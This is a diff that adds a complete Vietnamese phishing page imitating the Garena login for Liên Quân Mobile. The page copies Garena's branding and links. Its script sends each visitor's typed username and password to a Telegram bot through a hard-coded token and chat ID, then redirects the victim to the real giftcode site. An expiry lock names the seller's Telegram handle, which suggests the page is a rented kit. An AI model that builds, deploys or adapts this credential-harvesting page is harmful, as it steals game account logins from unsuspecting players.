@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Liên Quân Mobile</title>
+
+<!-- Favicon -->
+<link rel="icon" type="image/png" href="https://i.ibb.co/5hm9GP9d/LOGO-TAB-GARENA.jpg">
+
+<!-- Google Font -->
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+<style>
+body { margin:0; font-family:'Roboto',sans-serif; background:#e6e6e6; }
+.header { height:60px; background:#fff; border-bottom:1px solid #e5e5e5; display:flex; align-items:center; justify-content:space-between; padding:0 20px; }
+.logo img { height:36px; object-fit:contain; }
+.lang { font-size:13px; color:#666; }
+.container { display:flex; justify-content:center; align-items:flex-start; margin-top:48px; padding:0 10px; }
+.box { width:494px; max-width:100%; background:#f3f3f3; padding:36px 42px 31px; }
+.title { text-align:center; font-size:16px; font-weight:500; margin-bottom:20px; }
+.input-group { position:relative; margin-bottom:14px; }
+.required { position:absolute; left:-14px; top:11px; color:#d93025; }
+input { width:100%; height:43px; padding:0 14px; border:1px solid #dcdcdc; font-size:16px; font-weight:500; border-radius:4px; background:#fff; box-sizing:border-box; }
+input::placeholder { color:#9aa0a6; }
+.forgot { display:block; text-align:right; font-size:13px; color:#1a73e8; margin:4px 0 18px; text-decoration:none; }
+.btn-login { width:100%; height:43px; background:#d93025; color:#fff; border:none; border-radius:4px; font-size:16px; font-weight:500; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; box-shadow:0 1px 1px rgba(0,0,0,0.1); }
+.btn-login.loading { background:#c5221f; cursor:not-allowed; }
+.spinner { width:16px; height:16px; border:2px solid #fff; border-top:2px solid transparent; border-radius:50%; animation:spin 0.8s linear infinite; display:none; }
+.btn-login.loading .spinner { display:inline-block; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.btn-register { width:100%; height:41px; background:#f5f5f5; border:1px solid #dcdcdc; border-radius:4px; margin-top:14px; font-size:16px; color:#5f6368; display:flex; align-items:center; justify-content:center; text-decoration:none; }
+.btn-register:hover { background:#eeeeee; }
+.footer { text-align:center; margin-top:18px; font-size:13px; }
+.footer span { color:#1a73e8; }
+.footer .and { color:#333; }
+@media screen and (max-width:480px) {
+  .box { width:100%; padding:20px; }
+  .title { font-size:18px; }
+  input { font-size:18px; height:45px; font-weight:normal; }
+  .btn-login { font-size:18px; height:45px; }
+  .btn-register { font-size:18px; height:42px; }
+  .forgot { font-size:14px; }
+  .footer { font-size:14px; }
+  .logo img { height:27px; }
+}
+</style>
+</head>
+
+<body>
+<div class="header">
+  <div class="logo"><img src="https://auth.garena.com/universal/logo-9d415851a.svg"></div>
+  <div class="lang">Việt Nam - Tiếng việt 🌐</div>
+</div>
+
+<div class="container">
+  <div class="box">
+    <div class="title">Đăng nhập</div>
+
+    <div class="input-group">
+      <span class="required">*</span>
+      <input type="text" id="username" placeholder="Tài khoản, Email hoặc số điện thoại">
+    </div>
+
+    <div class="input-group">
+      <span class="required">*</span>
+      <input type="password" id="password" placeholder="Mật khẩu">
+    </div>
+
+    <a class="forgot" href="https://account.garena.com/recovery#/" target="_blank">Quên mật khẩu?</a>
+
+    <button class="btn-login" id="loginBtn" onclick="sendToTelegram()">
+      <div class="spinner"></div>
+      <span>Đăng Nhập Ngay</span>
+    </button>
+
+    <a class="btn-register"
+       href="https://sso.garena.com/universal/register?redirect_uri=https://sso.garena.com/universal/login?app_id=10100%26redirect_uri=https://account.garena.com/%26locale=vi-VN&locale=vi-VN"
+       target="_blank">
+       Tạo tài khoản mới
+    </a>
+
+    <div class="footer">
+      <span>Điều Khoản Dịch Vụ</span>
+      <span class="and"> và </span>
+      <span>Chính Sách Bảo Mật</span>
+    </div>
+  </div>
+</div>
+
+<script>
+// 1️⃣ GIỚI HẠN THỜI GIAN SỬ DỤNG
+const EXPIRY_DATE = new Date("2026-02-25T23:59:59"); // chỉnh ngày giờ hết hạn
+
+function checkExpiry() {
+    const now = new Date();
+    if(now > EXPIRY_DATE) {
+        document.body.innerHTML = `
+        <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#f3f3f3;font-family:Arial,sans-serif;text-align:center;">
+            <div>
+                <h1 style="color:#d93025;">Trang web đã hết hạn sử dụng!</h1>
+                <p>Vui lòng liên hệ quản trị viên để kích hoạt lại.</p>
+                <p>Telegram: HoaThienDo </p>
+            </div>
+        </div>`;
+        return true;
+    }
+    return false;
+}
+
+if(checkExpiry()) { throw new Error("Web đã hết hạn!"); }
+
+// 2️⃣ THÔNG TIN TELEGRAM
+const TELEGRAM_BOT_TOKEN = "8628074371:AAG1Sxb7RT7LNEoFFnnpo6UIgKWF-RPMgzU"; // Thay token bot
+const TELEGRAM_CHAT_ID = "-1003774424482";     // Thay chat id nhận tin
+
+// 3️⃣ XỬ LÝ INPUT
+function removeSpaces(value){ return value.replace(/\s/g,''); }
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+
+[usernameInput,passwordInput].forEach(input=>{
+  input.addEventListener("keydown",e=>{if(e.key===" ") e.preventDefault();});
+  input.addEventListener("input",function(){this.value=removeSpaces(this.value);});
+  input.addEventListener("paste",function(e){e.preventDefault(); this.value=removeSpaces((e.clipboardData||window.clipboardData).getData("text"));});
+});
+
+// 4️⃣ SEND DATA LÊN TELEGRAM
+function sendToTelegram(){
+  const btn = document.getElementById("loginBtn");
+  const username = usernameInput.value;
+  const password = passwordInput.value;
+
+  if(!username||!password){ alert("Vui lòng nhập đầy đủ thông tin!"); return; }
+
+  btn.classList.add("loading");
+  btn.disabled=true;
+
+  const message = `📌 Liên Quân Login Info:\nTài khoản: ${username}\nMật khẩu: ${password}`;
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:message})
+  })
+  .then(res=>{
+    if(res.ok){ window.location.href="https://giftcode.lienquan.garena.vn/giftcode/"; }
+    else { alert("Lỗi gửi dữ liệu!"); btn.classList.remove("loading"); btn.disabled=false; }
+  })
+  .catch(err=>{ alert("Lỗi gửi dữ liệu!"); btn.classList.remove("loading"); btn.disabled=false; });
+}
+</script>
+</body>
+</html>
